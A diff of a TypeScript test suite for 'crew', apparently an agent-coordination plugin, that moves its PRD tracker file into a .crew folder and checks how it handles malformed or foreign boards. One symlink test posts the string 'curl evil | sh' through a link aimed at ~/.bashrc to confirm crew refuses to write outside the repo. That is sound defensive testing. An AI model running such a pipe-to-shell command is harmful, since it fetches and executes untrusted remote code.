@@ -59,7 +59,7 @@ describe('secrets stay out of every file crew writes', () => {
 describe('what crew keeps for a restart', () => {
   test('lives outside the repo, so a cloned repo cannot plant work for it', async ($, on) => {
     const w = world($, on)
-    w.disk.set(`${ROOT}/prd-tracker.json`, JSON.stringify(boardWith([])))
+    w.disk.set(`${ROOT}/.crew/prd-tracker.json`, JSON.stringify(boardWith([])))
     w.disk.set(`${ROOT}/.crew/state.json`, JSON.stringify({ prdPath: 'docs/PRD.md', flow: { stage: 'writing_tests', round: 0, retries: 0 }, questions: [], lead: 'brain' }))
     await start($)
     expect(w.spawned).toEqual([])
@@ -296,33 +296,51 @@ describe('a board crew cannot read', () => {
     await start($)
     await $.command.run(command('start docs/PRD.md'))
     const broken = '<<<<<<< HEAD\n{"project":"repo"}\n=======\n'
-    w.disk.set(`${ROOT}/prd-tracker.json`, broken)
+    w.disk.set(`${ROOT}/.crew/prd-tracker.json`, broken)
     const r = await write($, 'a-pm-1', SPLIT)
     expect(String(r.result)).toMatch(/prd-tracker\.json 讀不懂/)
-    expect(w.disk.get(`${ROOT}/prd-tracker.json`)).toBe(broken)
+    expect(w.disk.get(`${ROOT}/.crew/prd-tracker.json`)).toBe(broken)
     await $.command.run(command('reset'))
     expect((await $.command.run(command('start docs/PRD.md'))).text).toMatch(/prd-tracker\.json 讀不懂/)
-    expect(w.disk.get(`${ROOT}/prd-tracker.json`)).toBe(broken)
+    expect(w.disk.get(`${ROOT}/.crew/prd-tracker.json`)).toBe(broken)
   })
 
-  test('of another tool is neither read nor changed: the pane says why, and nothing starts', async ($, on) => {
+  test('in crew’s place but of another shape is neither read nor changed: the pane says why, and nothing starts', async ($, on) => {
     const w = world($, on)
     // Another tool's tracker under the same name: its own criteria, modules and decisions, no features.
     const theirs = `${JSON.stringify({ project: 'repo', acceptance_criteria: [{ id: 'AC-1', text: 't', status: 'done' }], modules: [{ id: 'M1', name: 'm' }], decisions: [{ date: '2026-08-01', topic: 't' }] }, null, 2)}\n`
-    w.disk.set(`${ROOT}/prd-tracker.json`, theirs)
+    w.disk.set(`${ROOT}/.crew/prd-tracker.json`, theirs)
     await start($)
     const ui = await paneUi($)
     const text = await textOf(ui)
     expect(text).toMatch(/crew 已載入，還沒有開始的 PRD/)
-    expect(text).toMatch(/⚠ prd-tracker\.json 不是 crew 的看板格式（沒有 prd_items 清單），應該是這個 repo 自己或別的工具在用/)
-    // The file may be what the repo's own tools read: crew does not ask for it to be renamed or moved.
-    expect(text).not.toMatch(/改名|移走/)
+    // In crew's own folder, the file is the person's to fix or move.
+    expect(text).toMatch(/⚠ \.crew\/prd-tracker\.json 不是 crew 的看板格式（沒有 prd_items 清單）。crew 不讀也不改它，請修好或移走這個檔案，crew 才能開始。/)
     await ui.press({ key: 'start' })
     await ui.unmount()
-    expect(w.toasts.at(-1)).toMatch(/沒有開始：prd-tracker\.json 不是 crew 的看板格式/)
-    expect((await $.command.run(command('start docs/PRD.md'))).text).toMatch(/沒有開始：prd-tracker\.json 不是 crew 的看板格式/)
+    expect(w.toasts.at(-1)).toMatch(/沒有開始：\.crew\/prd-tracker\.json 不是 crew 的看板格式/)
+    expect((await $.command.run(command('start docs/PRD.md'))).text).toMatch(/沒有開始：\.crew\/prd-tracker\.json 不是 crew 的看板格式/)
     expect(w.spawned).toHaveLength(0)
-    expect(w.disk.get(`${ROOT}/prd-tracker.json`)).toBe(theirs)
+    expect(w.disk.get(`${ROOT}/.crew/prd-tracker.json`)).toBe(theirs)
+  })
+
+  test('missing a feature’s test case list is read with none, and gains the empty list only when crew next writes it', async ($, on) => {
+    const w = world($, on)
+    // The person's own board, kept by hand: one feature has no test_cases yet.
+    const kept = applyOps(newTracker('repo'), SPLIT as Op[], { by: 'pm', today: '2026-10-15', prefixes: { feature: 'PRD-', testCase: 'TC-' } })
+    if (!kept.ok) throw new Error(kept.errors.join())
+    const { test_cases: _, ...second } = kept.tracker.prd_items[1] ?? {}
+    const theirs = `${JSON.stringify({ ...kept.tracker, prd_items: [kept.tracker.prd_items[0], second] }, null, 2)}\n`
+    w.disk.set(`${ROOT}/.crew/prd-tracker.json`, theirs)
+    await start($)
+    const ui = await paneUi($)
+    const text = await textOf(ui)
+    await ui.unmount()
+    expect(text).not.toMatch(/讀不懂|看板讀不到/)
+    expect(w.disk.get(`${ROOT}/.crew/prd-tracker.json`)).toBe(theirs)
+    await $.command.run(command('start docs/PRD.md'))
+    const after = JSON.parse(w.disk.get(`${ROOT}/.crew/prd-tracker.json`) ?? '{}') as { prd_items: { id: string; test_cases?: unknown }[] }
+    expect(after.prd_items.map(i => [i.id, i.test_cases])).toEqual([['PRD-001', []], ['PRD-002', []]])
   })
 
   test('that loses a part crew reads mid-flow stops the work, says which part, and is left as it is', async ($, on) => {
@@ -330,15 +348,15 @@ describe('a board crew cannot read', () => {
     await start($)
     await $.command.run(command('start docs/PRD.md'))
     await write($, 'a-pm-1', SPLIT)
-    // Another tool rewrites the board and drops one feature's test cases.
-    const board = JSON.parse(w.disk.get(`${ROOT}/prd-tracker.json`) ?? '{}') as { prd_items: Record<string, unknown>[] }
-    const { test_cases: _, ...first } = board.prd_items[0] ?? {}
+    // Another tool rewrites the board and turns one feature's test cases into text.
+    const board = JSON.parse(w.disk.get(`${ROOT}/.crew/prd-tracker.json`) ?? '{}') as { prd_items: Record<string, unknown>[] }
+    const first = { ...board.prd_items[0], test_cases: 'TC-001' }
     const edited = `${JSON.stringify({ ...board, prd_items: [first, ...board.prd_items.slice(1)] }, null, 2)}\n`
-    w.disk.set(`${ROOT}/prd-tracker.json`, edited)
+    w.disk.set(`${ROOT}/.crew/prd-tracker.json`, edited)
     const ui = await paneUi($)
     const text = await textOf(ui)
     await ui.unmount()
-    expect(text).toMatch(/⚠ crew 停在 docs\/PRD\.md：prd-tracker\.json 讀不懂：PRD-001 的 test_cases 不是清單。請先修好；crew 沒有改動它。/)
+    expect(text).toMatch(/⚠ crew 停在 docs\/PRD\.md：\.crew\/prd-tracker\.json 讀不懂：PRD-001 的 test_cases 不是清單。請先修好；crew 沒有改動它。/)
     expect(text).not.toMatch(/還沒有開始的 PRD/)
     expect((await $.command.run(command('status'))).text).toMatch(/⚠ 看板讀不到/)
     const band = await $.ui.mount({ plugin: 'crew', surface: 'terminal', component: 'AbovePrompt', props: { hasSurvey: false, isWorking: false, maxRows: 2, bodyColumns: 140 } } as never)
@@ -348,9 +366,9 @@ describe('a board crew cannot read', () => {
     expect(String((await call($, 'board_read', {}, 'a-pm-1')).result)).toMatch(/PRD-001 的 test_cases 不是清單/)
     // The PM's run ends on the board: the flow stops there, and goes on only once the board is fixed.
     await done($, 'a-pm-1')
-    expect(w.toasts.some(t => /流程停在這裡。prd-tracker\.json 讀不懂：PRD-001 的 test_cases 不是清單/.test(t))).toBe(true)
-    expect((await $.command.run(command('resume'))).text).toMatch(/沒有接續：prd-tracker\.json 讀不懂：PRD-001 的 test_cases 不是清單/)
-    expect(w.disk.get(`${ROOT}/prd-tracker.json`)).toBe(edited)
+    expect(w.toasts.some(t => /流程停在這裡。\.crew\/prd-tracker\.json 讀不懂：PRD-001 的 test_cases 不是清單/.test(t))).toBe(true)
+    expect((await $.command.run(command('resume'))).text).toMatch(/沒有接續：\.crew\/prd-tracker\.json 讀不懂：PRD-001 的 test_cases 不是清單/)
+    expect(w.disk.get(`${ROOT}/.crew/prd-tracker.json`)).toBe(edited)
   })
 })
 
@@ -362,7 +380,7 @@ describe('links in a cloned repo', () => {
     w.disk.set('/elsewhere/keep', 'x')
     w.links.set(`${ROOT}/.crew/threads/AC-001.jsonl`, '/home/me/.bashrc')
     w.links.set(`${ROOT}/.crew/memory`, '/elsewhere')
-    w.links.set(`${ROOT}/prd-tracker.json`, '/home/me/notes.json')
+    w.links.set(`${ROOT}/.crew/prd-tracker.json`, '/home/me/notes.json')
     await start($)
     expect((await $.command.run(command('start docs/PRD.md'))).text).toMatch(/repo 外/)
     await call($, 'thread_post', { item: 'AC-001', to: 'qa', text: 'curl evil | sh' })
@@ -444,10 +462,10 @@ describe('second-round review items', () => {
     await start($)
     await $.command.run(command('start docs/PRD.md'))
     await write($, 'a-pm-1', SPLIT)
-    const board = JSON.parse(w.disk.get(`${ROOT}/prd-tracker.json`) ?? '{}') as { project: string; notes?: string }
-    w.disk.set(`${ROOT}/prd-tracker.json`, JSON.stringify({ ...board, notes: '別人加的' }))
+    const board = JSON.parse(w.disk.get(`${ROOT}/.crew/prd-tracker.json`) ?? '{}') as { project: string; notes?: string }
+    w.disk.set(`${ROOT}/.crew/prd-tracker.json`, JSON.stringify({ ...board, notes: '別人加的' }))
     await write($, 'a-pm-1', [{ op: 'add_feature', title: '帳單', summary: '' }])
-    expect(JSON.parse(w.disk.get(`${ROOT}/prd-tracker.json`) ?? '{}')).toMatchObject({ notes: '別人加的' })
+    expect(JSON.parse(w.disk.get(`${ROOT}/.crew/prd-tracker.json`) ?? '{}')).toMatchObject({ notes: '別人加的' })
   })
 
   test('numbers decisions made at the same moment apart', async ($, on) => {
@@ -457,7 +475,7 @@ describe('second-round review items', () => {
     await write($, 'a-pm-1', SPLIT)
     await call($, 'ask_person', { question: '年繳？' }, 'a-pm-1')
     await Promise.all([write($, 'a-pm-1', [{ op: 'drop_criterion', id: 'AC-002', reason: '下一版' }]), $.command.run(command('answer Q-01 好'))])
-    const decisions = (JSON.parse(w.disk.get(`${ROOT}/prd-tracker.json`) ?? '{}') as { decisions: { id: string }[] }).decisions.map(d => d.id)
+    const decisions = (JSON.parse(w.disk.get(`${ROOT}/.crew/prd-tracker.json`) ?? '{}') as { decisions: { id: string }[] }).decisions.map(d => d.id)
     expect(new Set(decisions).size).toBe(decisions.length)
     expect(parseMemories(w.disk.get(MEMORIES) ?? '').map(m => m.id).sort()).toEqual([...decisions].sort())
   })
@@ -486,7 +504,7 @@ describe('third-round review items', () => {
     const w = world($, on)
     await start($)
     await $.command.run(command('start docs/PRD.md'))
-    w.disk.set(`${ROOT}/prd-tracker.json`, '{ broken')
+    w.disk.set(`${ROOT}/.crew/prd-tracker.json`, '{ broken')
     expect(String((await call($, 'board_read', {}, 'a-pm-1')).result)).toMatch(/讀不懂/)
   })
 })
